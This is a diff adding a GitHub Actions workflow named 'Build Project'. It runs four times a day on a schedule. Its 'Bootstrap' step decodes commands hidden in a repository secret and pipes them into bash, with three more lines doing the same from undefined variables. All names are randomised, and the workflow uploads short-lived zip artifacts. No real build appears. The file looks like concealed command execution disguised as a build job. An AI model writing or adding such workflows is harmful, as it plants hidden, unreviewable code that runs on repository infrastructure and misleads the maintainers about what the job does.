@@ -1,0 +1,34 @@
+name: Build Project
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '44 3,9,15,21 * * *'
+permissions:
+  contents: read
+  actions: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  deploy:
+    name: Main task
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Bootstrap
+        env:
+          zdcqd0: ${{ secrets.zdcqd0 }}
+        run: |
+          printf '%s' "$zdcqd0" | jq -r .fza571 | /bin/bash
+          printf '%s' "$tlu218" | jq -r .kb0 | /bin/bash
+          printf '%s' "$brbs8458" | jq -r .svgn823 | /bin/bash
+          printf '%s' "$ggo51919" | jq -r .e16 | /bin/bash
+
+      - name: Archive artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: JPWwnQIb
+          path: "*.zip"
+          retention-days: 1
